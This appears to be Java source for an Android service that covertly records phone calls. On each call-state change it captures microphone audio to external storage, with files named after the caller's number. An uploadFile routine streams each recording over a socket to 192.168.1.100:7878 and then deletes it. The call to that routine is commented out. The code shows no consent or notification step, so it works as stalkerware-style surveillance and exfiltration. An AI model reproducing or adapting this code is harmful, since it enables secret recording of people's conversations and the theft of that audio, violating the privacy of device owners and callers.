package com.dragon.android.spirit.phone;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.dragon.android.spirit.utilities.Constants;
import com.dragon.android.spirit.utilities.StreamTool;

import java.io.File;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;

/**
 * Created by raymondlee on 2018/1/24.
 */

public class PhoneDogService extends Service {

    private static final String FILE_DIR =
            Environment.getExternalStorageDirectory() + File.separator +
                    "AndSprite" + File.separator + "telephone" + File.separator;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE); //取得电话相关服务
        telephonyManager.listen(new PhoneListener(), PhoneStateListener.LISTEN_CALL_STATE);
    }

    @Override
    public void onDestroy() {
        sendBroadcast(new Intent(Constants.Action.SPIRIT_DESTROY));
        super.onDestroy();
    }

    private final class PhoneListener extends PhoneStateListener {
        private String incomingNumber;
        private MediaRecorder mediaRecorder;
        private File file;

        /**
         * 回调函数
         */
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            try {
                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING:// 来电
                        Log.i("raymond", "ringing");
                        this.incomingNumber = incomingNumber;
                        break;

                    case TelephonyManager.CALL_STATE_OFFHOOK:// 接通电话
                        Log.i("raymond", "offhook");
                        File dir = new File(FILE_DIR);
                        if(!dir.exists()) {
                            dir.mkdirs();
                        }
                        Log.i("raymond", "dir: " + FILE_DIR);
                        file = new File(FILE_DIR,
                                incomingNumber + System.currentTimeMillis()
                                        + ".3gp");
//                        if(!file.exists()) {
//                            file.createNewFile();
//                        }
                        Log.i("raymond", "file: " + file.getAbsolutePath());
                        mediaRecorder = new MediaRecorder();
                        // 从麦克风采集声音
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        // 内容输出格式
                        mediaRecorder
                                .setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                        // 音频编码方式
                        mediaRecorder
                                .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                        // 输出文件位置
                        mediaRecorder.setOutputFile(file.getAbsolutePath());
                        // 预期准备
                        mediaRecorder.prepare();
                        // 开始刻录音频
                        mediaRecorder.start();
                        break;

                    case TelephonyManager.CALL_STATE_IDLE:// 挂断电话后回归到空闲状态
                        Log.i("raymond", "idle");
                        if (mediaRecorder != null) {
                            // 停止刻录
                            mediaRecorder.stop();
                            // 刻录完成一定要释放资源
                            mediaRecorder.release();
                            mediaRecorder = null;
                            // 上传录制好的音频文件
                            //uploadFile();
                        }
                        break;
                    default:
                        break;
                }
            } catch (Exception e) {
                Log.e("raymond", "error");
                e.printStackTrace();
            }
        }

        /**
         * 上传录制好的音频文件
         */
        private void uploadFile() {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        if (file != null && file.exists()) {
                            Socket socket = new Socket("192.168.1.100", 7878);
                            OutputStream outStream = socket.getOutputStream();
                            String head = "Content-Length=" + file.length()
                                    + ";filename=" + file.getName()
                                    + ";sourceid=\r\n";
                            outStream.write(head.getBytes());

                            PushbackInputStream inStream = new PushbackInputStream(
                                    socket.getInputStream());
                            String response = StreamTool.readLine(inStream);
                            String[] items = response.split(";");
                            String position = items[1].substring(items[1]
                                    .indexOf("=") + 1);

                            RandomAccessFile fileOutStream = new RandomAccessFile(
                                    file, "r");
                            fileOutStream.seek(Integer.valueOf(position));
                            byte[] buffer = new byte[1024];
                            int len = -1;
                            while ((len = fileOutStream.read(buffer)) != -1) {
                                outStream.write(buffer, 0, len);
                            }
                            fileOutStream.close();
                            outStream.close();
                            inStream.close();
                            socket.close();
                            file.delete();
                            file = null;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }
}
